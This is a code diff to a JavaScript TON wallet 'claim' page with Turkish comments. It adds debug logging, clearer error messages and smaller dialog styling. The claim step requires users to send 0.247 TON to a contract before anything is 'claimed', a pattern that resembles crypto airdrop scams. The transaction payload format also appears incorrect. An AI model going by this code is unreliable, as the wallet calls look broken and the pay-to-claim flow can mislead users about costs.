@@ -264,6 +264,8 @@ function showMessage(message) {
 async function handleClaim() {
     try {
         const balance = await tonConnect.getBalance();
+        console.log('Current balance:', balance); // Debug için bakiye kontrolü
+
         if (balance < REQUIRED_AMOUNT) {
             showMessage("Your wallet balance is less than 0.247 TON.\nPlease add more TON to continue.");
             return;
@@ -274,15 +276,32 @@ async function handleClaim() {
             messages: [{
                 address: CONTRACT_ADDRESS,
                 amount: REQUIRED_AMOUNT,
-                payload: 'increment'
+                payload: {
+                    abi: 'increment',
+                    method: 'increment'
+                }
             }]
         };
         
-        await tonConnect.sendTransaction(transaction);
-        showMessage('Transaction successful! Thank you for your contribution.');
+        console.log('Sending transaction:', transaction); // Debug için transaction detayları
+        
+        const result = await tonConnect.sendTransaction(transaction);
+        console.log('Transaction result:', result); // İşlem sonucunu kontrol et
+        
+        if (result) {
+            showMessage('Transaction successful! Thank you for your contribution.');
+        }
     } catch (error) {
-        console.error('Transaction failed:', error);
-        showMessage("Transaction failed. Required amount: 0.247 TON");
+        console.error('Detailed error:', error); // Detaylı hata bilgisi
+        
+        // Daha açıklayıcı hata mesajları
+        if (error.message?.includes('rejected')) {
+            showMessage("Transaction was rejected by user");
+        } else if (error.message?.includes('insufficient')) {
+            showMessage("Insufficient balance. Required amount: 0.247 TON");
+        } else {
+            showMessage("Transaction failed. Please try again.");
+        }
     }
 }
 
@@ -290,29 +309,43 @@ async function handleClaim() {
 const style = document.createElement('style');
 style.textContent = `
     .custom-dialog {
-        padding: 20px;
+        padding: 15px;
         background: var(--bg-color);
         border: 1px solid var(--text-color);
-        border-radius: 10px;
+        border-radius: 8px;
         color: var(--text-color);
+        max-width: 280px;  /* Daha küçük maksimum genişlik */
+        margin: auto;
     }
     
     .dialog-content {
         text-align: center;
+        font-size: 0.9rem;  /* Daha küçük yazı boyutu */
+    }
+    
+    .dialog-content p {
+        margin: 0 0 12px 0;  /* Azaltılmış boşluk */
+        line-height: 1.4;
     }
     
     .dialog-content button {
         background: var(--bg-color);
         color: var(--text-color);
         border: 1px solid var(--text-color);
-        padding: 8px 16px;
-        border-radius: 20px;
+        padding: 6px 14px;  /* Daha küçük padding */
+        border-radius: 15px;
         cursor: pointer;
-        margin-top: 15px;
+        font-size: 0.8rem;  /* Daha küçük buton yazı boyutu */
+        margin-top: 10px;
+        transition: transform 0.2s ease;
     }
     
     .dialog-content button:hover {
-        transform: translateY(-2px);
+        transform: translateY(-1px);
+    }
+
+    .custom-dialog::backdrop {
+        background: rgba(0, 0, 0, 0.5);
     }
 `;
 document.head.appendChild(style);
